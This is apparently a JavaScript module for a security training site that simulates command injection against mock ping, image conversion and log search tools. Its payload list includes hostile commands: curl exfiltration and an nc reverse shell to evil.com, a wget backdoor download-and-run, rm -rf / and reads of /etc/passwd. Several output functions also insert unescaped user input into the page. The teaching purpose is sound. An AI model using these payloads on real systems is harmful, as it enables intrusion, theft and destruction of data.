/**
 * Command Injection Challenge Interface
 * Interactive command injection demonstration and testing environment
 */

if (!window.SecureTrainer) {
    window.SecureTrainer = {};
}

SecureTrainer.CommandInjection = {
    // Command injection payloads and techniques
    payloads: {
        basic: [
            '; ls -la',
            '&& cat /etc/passwd',
            '| whoami',
            '; id',
            '&& pwd'
        ],
        advanced: [
            '; curl http://evil.com/exfiltrate?data=$(cat /etc/passwd | base64)',
            '&& find / -name "*.conf" -exec cat {} \\;',
            '| nc evil.com 4444 -e /bin/bash',
            '; python -c "import os; os.system(\'rm -rf /\')"',
            '&& wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh'
        ],
        bypass: [
            '; c\\at /etc/passwd',
            '&& /bi\\n/ls',
            '| `echo d2hvYW1p | base64 -d`',
            '; $(echo "id")',
            '&& {cat,/etc/passwd}'
        ]
    },

    // Vulnerable application scenarios
    vulnerableApps: {
        pingTool: {
            name: "Network Ping Tool",
            description: "A network diagnostic tool that pings IP addresses",
            command: "ping -c 4",
            sanitization: "none",
            context: "system"
        },
        imageConverter: {
            name: "Image Converter",
            description: "Tool that converts image formats using command line",
            command: "convert",
            sanitization: "basic",
            context: "file"
        },
        logViewer: {
            name: "Log File Viewer", 
            description: "System log viewer with search capabilities",
            command: "grep",
            sanitization: "incomplete",
            context: "search"
        }
    },

    currentChallenge: null,
    commandHistory: [],

    init() {
        this.createCommandInterface();
        this.loadVulnerableApp('pingTool');
        this.setupEventListeners();
    },

    createCommandInterface() {
        const container = document.getElementById('challenge-workspace');
        if (!container) return;

        container.innerHTML = `
            <div class="cmd-injection-container">
                <!-- Command Builder Panel -->
                <div class="cmd-panel">
                    <h3 class="text-lg font-semibold mb-4">Command Injection Tester</h3>
                    <div class="mb-4">
                        <label class="block text-sm font-medium mb-2">Select Vulnerable Application:</label>
                        <select id="vulnerable-cmd-app" class="w-full px-3 py-2 border rounded-lg">
                            <option value="pingTool">Network Ping Tool</option>
                            <option value="imageConverter">Image Converter</option>
                            <option value="logViewer">Log File Viewer</option>
                        </select>
                    </div>
                    <div class="mb-4">
                        <label class="block text-sm font-medium mb-2">Input Parameter:</label>
                        <input type="text" id="cmd-input" 
                               placeholder="Enter input parameter..."
                               class="w-full px-3 py-2 border rounded-lg font-mono text-sm">
                    </div>
                    <div class="mb-4">
                        <label class="block text-sm font-medium mb-2">Injection Payload:</label>
                        <textarea id="cmd-payload" 
                                placeholder="Enter command injection payload..."
                                class="w-full h-24 px-3 py-2 border rounded-lg font-mono text-sm"></textarea>
                    </div>
                    <div class="flex gap-2 mb-4">
                        <button id="execute-cmd-btn" class="btn-primary">Execute Command</button>
                        <button id="load-cmd-example-btn" class="btn-secondary">Load Example</button>
                        <button id="clear-cmd-btn" class="btn-secondary">Clear</button>
                    </div>
                    
                    <!-- Payload Library -->
                    <div class="payload-library">
                        <h4 class="font-medium mb-2">Injection Techniques:</h4>
                        <div class="grid grid-cols-3 gap-2 mb-4">
                            <button class="cmd-category-btn" data-category="basic">Basic</button>
                            <button class="cmd-category-btn" data-category="advanced">Advanced</button>
                            <button class="cmd-category-btn" data-category="bypass">Bypass</button>
                        </div>
                        <div id="cmd-payload-list" class="max-h-32 overflow-y-auto"></div>
                    </div>
                </div>

                <!-- Vulnerable Application Interface -->
                <div class="cmd-panel">
                    <h3 class="text-lg font-semibold mb-4">Target Application</h3>
                    <div id="vulnerable-cmd-app-container" class="border rounded-lg p-4 bg-gray-50">
                        <!-- Dynamic vulnerable app content -->
                    </div>
                </div>

                <!-- Terminal Output Panel -->
                <div class="cmd-panel">
                    <h3 class="text-lg font-semibold mb-4">Command Execution Results</h3>
                    <div id="terminal-output" class="terminal-container">
                        <div class="terminal-header">
                            <span class="terminal-title">SecureTrainer Terminal</span>
                            <div class="terminal-controls">
                                <span class="terminal-btn terminal-btn-close"></span>
                                <span class="terminal-btn terminal-btn-minimize"></span>
                                <span class="terminal-btn terminal-btn-maximize"></span>
                            </div>
                        </div>
                        <div class="terminal-body">
                            <div id="terminal-content" class="terminal-text">
                                <div class="terminal-line">user@securetrainer:~$ <span class="text-gray-400">Ready for command execution...</span></div>
                            </div>
                        </div>
                    </div>
                    <div class="mt-4">
                        <h4 class="font-medium mb-2">Challenge Progress:</h4>
                        <div class="progress-bar">
                            <div id="cmd-progress" class="progress-fill" style="width: 0%"></div>
                        </div>
                        <div class="text-sm text-gray-600 mt-1">
                            <span id="cmd-score">0</span> / 100 points
                        </div>
                    </div>
                </div>
            </div>
        `;
    },

    loadVulnerableApp(appType) {
        const container = document.getElementById('vulnerable-cmd-app-container');
        const app = this.vulnerableApps[appType];
        
        if (!container || !app) return;

        let appHTML = '';
        switch(appType) {
            case 'pingTool':
                appHTML = this.createPingTool();
                break;
            case 'imageConverter':
                appHTML = this.createImageConverter();
                break;
            case 'logViewer':
                appHTML = this.createLogViewer();
                break;
        }

        container.innerHTML = `
            <div class="vulnerable-cmd-app">
                <h4 class="font-medium mb-2">${app.name}</h4>
                <p class="text-sm text-gray-600 mb-4">${app.description}</p>
                <div class="app-content">
                    ${appHTML}
                </div>
            </div>
        `;
    },

    createPingTool() {
        return `
            <div class="ping-tool">
                <h5 class="font-medium mb-3">Network Ping Utility</h5>
                <div class="ping-form">
                    <div class="mb-3">
                        <label class="block text-sm mb-1">Target IP Address:</label>
                        <input type="text" id="ping-target" placeholder="192.168.1.1" 
                               class="w-full p-2 border rounded">
                        <div class="text-xs text-gray-500 mt-1">
                            Command: <code>ping -c 4 <span id="ping-preview">TARGET</span></code>
                        </div>
                    </div>
                    <button id="execute-ping" class="btn-primary text-sm">Execute Ping</button>
                </div>
                <div id="ping-output" class="mt-4 p-3 bg-black text-green-400 rounded font-mono text-sm min-h-24">
                    <div>user@server:~$ ping -c 4</div>
                    <div class="text-gray-500">Waiting for input...</div>
                </div>
            </div>
        `;
    },

    createImageConverter() {
        return `
            <div class="image-converter">
                <h5 class="font-medium mb-3">Image Format Converter</h5>
                <div class="converter-form">
                    <div class="mb-3">
                        <label class="block text-sm mb-1">Source File:</label>
                        <input type="text" id="source-file" placeholder="image.jpg" 
                               class="w-full p-2 border rounded">
                    </div>
                    <div class="mb-3">
                        <label class="block text-sm mb-1">Output Format:</label>
                        <select id="output-format" class="w-full p-2 border rounded">
                            <option value="png">PNG</option>
                            <option value="gif">GIF</option>
                            <option value="bmp">BMP</option>
                        </select>
                    </div>
                    <div class="text-xs text-gray-500 mb-3">
                        Command: <code>convert <span id="convert-preview">SOURCE</span> output.<span id="format-preview">FORMAT</span></code>
                    </div>
                    <button id="execute-convert" class="btn-primary text-sm">Convert Image</button>
                </div>
                <div id="convert-output" class="mt-4 p-3 bg-black text-green-400 rounded font-mono text-sm min-h-24">
                    <div>user@server:~$ convert</div>
                    <div class="text-gray-500">Ready to convert image...</div>
                </div>
            </div>
        `;
    },

    createLogViewer() {
        return `
            <div class="log-viewer">
                <h5 class="font-medium mb-3">System Log Search</h5>
                <div class="log-form">
                    <div class="mb-3">
                        <label class="block text-sm mb-1">Log File:</label>
                        <select id="log-file" class="w-full p-2 border rounded">
                            <option value="/var/log/apache2/access.log">Apache Access Log</option>
                            <option value="/var/log/auth.log">Authentication Log</option>
                            <option value="/var/log/syslog">System Log</option>
                        </select>
                    </div>
                    <div class="mb-3">
                        <label class="block text-sm mb-1">Search Pattern:</label>
                        <input type="text" id="search-pattern" placeholder="ERROR" 
                               class="w-full p-2 border rounded">
                    </div>
                    <div class="text-xs text-gray-500 mb-3">
                        Command: <code>grep "<span id="grep-preview">PATTERN</span>" <span id="file-preview">FILE</span></code>
                    </div>
                    <button id="execute-grep" class="btn-primary text-sm">Search Logs</button>
                </div>
                <div id="grep-output" class="mt-4 p-3 bg-black text-green-400 rounded font-mono text-sm min-h-24">
                    <div>user@server:~$ grep</div>
                    <div class="text-gray-500">Ready to search logs...</div>
                </div>
            </div>
        `;
    },

    setupEventListeners() {
        // App selector
        const appSelect = document.getElementById('vulnerable-cmd-app');
        if (appSelect) {
            appSelect.addEventListener('change', (e) => {
                this.loadVulnerableApp(e.target.value);
                this.setupAppEventListeners();
            });
        }

        // Command execution
        const executeBtn = document.getElementById('execute-cmd-btn');
        if (executeBtn) {
            executeBtn.addEventListener('click', () => this.executeCommand());
        }

        // Example loading
        const loadExampleBtn = document.getElementById('load-cmd-example-btn');
        if (loadExampleBtn) {
            loadExampleBtn.addEventListener('click', () => this.loadRandomPayload());
        }

        // Clear button
        const clearBtn = document.getElementById('clear-cmd-btn');
        if (clearBtn) {
            clearBtn.addEventListener('click', () => {
                document.getElementById('cmd-input').value = '';
                document.getElementById('cmd-payload').value = '';
            });
        }

        // Category buttons
        document.querySelectorAll('.cmd-category-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                this.showPayloadCategory(e.target.dataset.category);
            });
        });

        this.setupAppEventListeners();
    },

    setupAppEventListeners() {
        // Ping tool
        const executePing = document.getElementById('execute-ping');
        const pingTarget = document.getElementById('ping-target');
        if (executePing && pingTarget) {
            pingTarget.addEventListener('input', (e) => {
                document.getElementById('ping-preview').textContent = e.target.value || 'TARGET';
            });
            
            executePing.addEventListener('click', () => {
                this.simulatePingCommand(pingTarget.value);
            });
        }

        // Image converter
        const executeConvert = document.getElementById('execute-convert');
        const sourceFile = document.getElementById('source-file');
        const outputFormat = document.getElementById('output-format');
        if (executeConvert && sourceFile && outputFormat) {
            sourceFile.addEventListener('input', (e) => {
                document.getElementById('convert-preview').textContent = e.target.value || 'SOURCE';
            });
            
            outputFormat.addEventListener('change', (e) => {
                document.getElementById('format-preview').textContent = e.target.value;
            });
            
            executeConvert.addEventListener('click', () => {
                this.simulateConvertCommand(sourceFile.value, outputFormat.value);
            });
        }

        // Log viewer
        const executeGrep = document.getElementById('execute-grep');
        const searchPattern = document.getElementById('search-pattern');
        const logFile = document.getElementById('log-file');
        if (executeGrep && searchPattern && logFile) {
            searchPattern.addEventListener('input', (e) => {
                document.getElementById('grep-preview').textContent = e.target.value || 'PATTERN';
            });
            
            logFile.addEventListener('change', (e) => {
                document.getElementById('file-preview').textContent = e.target.value;
            });
            
            executeGrep.addEventListener('click', () => {
                this.simulateGrepCommand(searchPattern.value, logFile.value);
            });
        }
    },

    showPayloadCategory(category) {
        const payloadList = document.getElementById('cmd-payload-list');
        if (!payloadList || !this.payloads[category]) return;

        const payloads = this.payloads[category];
        payloadList.innerHTML = payloads.map(payload => `
            <div class="payload-item mb-2 p-2 bg-gray-100 rounded cursor-pointer hover:bg-gray-200"
                 onclick="SecureTrainer.CommandInjection.selectPayload('${payload.replace(/'/g, "\\'")}')">
                <code class="text-xs">${this.escapeHtml(payload)}</code>
            </div>
        `).join('');
    },

    selectPayload(payload) {
        const textarea = document.getElementById('cmd-payload');
        if (textarea) {
            textarea.value = payload;
        }
    },

    loadRandomPayload() {
        const categories = Object.keys(this.payloads);
        const randomCategory = categories[Math.floor(Math.random() * categories.length)];
        const payloads = this.payloads[randomCategory];
        const randomPayload = payloads[Math.floor(Math.random() * payloads.length)];
        
        this.selectPayload(randomPayload);
        
        // Also set a sample input
        const sampleInputs = {
            pingTool: '192.168.1.1',
            imageConverter: 'test.jpg',
            logViewer: 'ERROR'
        };
        
        const appType = document.getElementById('vulnerable-cmd-app').value;
        const inputField = document.getElementById('cmd-input');
        if (inputField && sampleInputs[appType]) {
            inputField.value = sampleInputs[appType];
        }
    },

    executeCommand() {
        const input = document.getElementById('cmd-input').value;
        const payload = document.getElementById('cmd-payload').value;
        const appType = document.getElementById('vulnerable-cmd-app').value;
        
        if (!input.trim()) {
            this.showTerminalOutput('Error: Please enter an input parameter', 'error');
            return;
        }

        const fullInput = input + (payload ? payload : '');
        const result = this.simulateCommandInjection(fullInput, appType);
        
        this.showTerminalOutput(result.output, result.type);
        
        if (result.type === 'success') {
            this.updateProgress(result.points);
        }
    },

    simulateCommandInjection(input, appType) {
        const app = this.vulnerableApps[appType];
        const dangerous = [';', '&&', '|', '`', '$', '\\'];
        const hasDangerous = dangerous.some(char => input.includes(char));

        if (!hasDangerous) {
            return {
                type: 'info',
                output: `user@server:~$ ${app.command} ${input}\nCommand executed safely - no injection detected.`,
                points: 5
            };
        }

        // Simulate command injection execution
        const mockResults = {
            '; ls -la': 'drwxr-xr-x 2 root root 4096 Dec 1 10:00 .\ndrwxr-xr-x 3 root root 4096 Dec 1 09:00 ..\n-rw-r--r-- 1 root root  220 Dec 1 09:00 .bash_logout\n-rw-r--r-- 1 root root 3771 Dec 1 09:00 .bashrc',
            '&& cat /etc/passwd': 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin',
            '| whoami': 'root',
            '; id': 'uid=0(root) gid=0(root) groups=0(root)',
            '&& pwd': '/home/user'
        };

        // Find matching injection pattern
        let matchedPattern = null;
        let injectionResult = 'Command injection successful!';
        
        for (const pattern in mockResults) {
            if (input.includes(pattern)) {
                matchedPattern = pattern;
                injectionResult = mockResults[pattern];
                break;
            }
        }

        return {
            type: 'success',
            output: `user@server:~$ ${app.command} ${input}\n${injectionResult}`,
            points: matchedPattern ? 20 : 10
        };
    },

    simulatePingCommand(target) {
        const output = document.getElementById('ping-output');
        if (!output) return;

        const hasInjection = [';', '&&', '|'].some(char => target.includes(char));
        
        if (hasInjection) {
            output.innerHTML = `
                <div>user@server:~$ ping -c 4 ${target}</div>
                <div class="text-red-400">Command injection detected!</div>
                <div>PING ${target.split(/[;&|]/)[0]} (192.168.1.1) 56(84) bytes of data.</div>
                <div class="text-yellow-400">${target}</div>
            `;
        } else {
            output.innerHTML = `
                <div>user@server:~$ ping -c 4 ${target}</div>
                <div>PING ${target} (192.168.1.1) 56(84) bytes of data.</div>
                <div>64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=0.123 ms</div>
                <div>64 bytes from 192.168.1.1: icmp_seq=2 ttl=64 time=0.156 ms</div>
                <div>--- ${target} ping statistics ---</div>
                <div>4 packets transmitted, 4 received, 0% packet loss</div>
            `;
        }
    },

    simulateConvertCommand(source, format) {
        const output = document.getElementById('convert-output');
        if (!output) return;

        const hasInjection = [';', '&&', '|'].some(char => source.includes(char));
        
        if (hasInjection) {
            output.innerHTML = `
                <div>user@server:~$ convert ${source} output.${format}</div>
                <div class="text-red-400">Command injection detected!</div>
                <div class="text-yellow-400">${source}</div>
            `;
        } else {
            output.innerHTML = `
                <div>user@server:~$ convert ${source} output.${format}</div>
                <div>Converting ${source} to ${format} format...</div>
                <div class="text-green-400">Conversion completed: output.${format}</div>
            `;
        }
    },

    simulateGrepCommand(pattern, file) {
        const output = document.getElementById('grep-output');
        if (!output) return;

        const hasInjection = [';', '&&', '|'].some(char => pattern.includes(char));
        
        if (hasInjection) {
            output.innerHTML = `
                <div>user@server:~$ grep "${pattern}" ${file}</div>
                <div class="text-red-400">Command injection detected!</div>
                <div class="text-yellow-400">${pattern}</div>
            `;
        } else {
            output.innerHTML = `
                <div>user@server:~$ grep "${pattern}" ${file}</div>
                <div>Dec  1 10:15:32 server sshd[1234]: ${pattern} in authentication</div>
                <div>Dec  1 10:16:45 server httpd[5678]: ${pattern} accessing restricted area</div>
                <div>Dec  1 10:17:12 server kernel: ${pattern} in system process</div>
            `;
        }
    },

    showTerminalOutput(output, type) {
        const terminal = document.getElementById('terminal-content');
        if (!terminal) return;

        const timestamp = new Date().toLocaleTimeString();
        const typeClasses = {
            success: 'text-green-400',
            error: 'text-red-400',
            info: 'text-blue-400'
        };

        terminal.innerHTML = `
            <div class="terminal-line">[${timestamp}] Command execution result:</div>
            <div class="terminal-line ${typeClasses[type] || 'text-white'}">${output}</div>
        `;
    },

    updateProgress(points) {
        const currentScore = parseInt(document.getElementById('cmd-score').textContent) || 0;
        const newScore = Math.min(currentScore + points, 100);
        
        document.getElementById('cmd-score').textContent = newScore;
        document.getElementById('cmd-progress').style.width = newScore + '%';
        
        if (newScore >= 100) {
            SecureTrainer.Analytics.trackChallengeCompletion('command_injection', newScore);
        }
    },

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }
};

// Auto-initialize when challenge is loaded
document.addEventListener('DOMContentLoaded', () => {
    if (document.getElementById('challenge-workspace')) {
        SecureTrainer.CommandInjection.init();
    }
});